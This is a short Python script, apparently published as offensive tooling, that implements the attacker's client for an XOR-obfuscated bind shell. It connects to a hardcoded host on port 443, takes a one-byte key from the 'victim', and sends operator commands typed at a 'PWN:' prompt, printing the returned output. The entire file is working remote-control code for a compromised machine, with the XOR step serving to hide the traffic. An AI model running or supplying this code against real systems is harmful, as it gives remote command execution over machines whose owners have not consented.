#Bind Shell (Client) (XOR Algorithm) 
#Author Yehia Elghaly

import socket
import os

# XOR encryption & decryption function
def encrypt(data, key):
    encrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ key[i % len(key)])
    return bytes(encrypted_data)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("172.16.110.130", 443))

# it receive key from victim
key = client_socket.recv(1)

while True:
    command = input("PWN: ")
    # it encrypt command and send it to victim
    command = encrypt(command.encode(), key)
    client_socket.send(command)

    # It receive the output, decrypt and execute it
    output = client_socket.recv(1024)
    output = encrypt(output, key).decode()
    print("" + output)

client_socket.close()


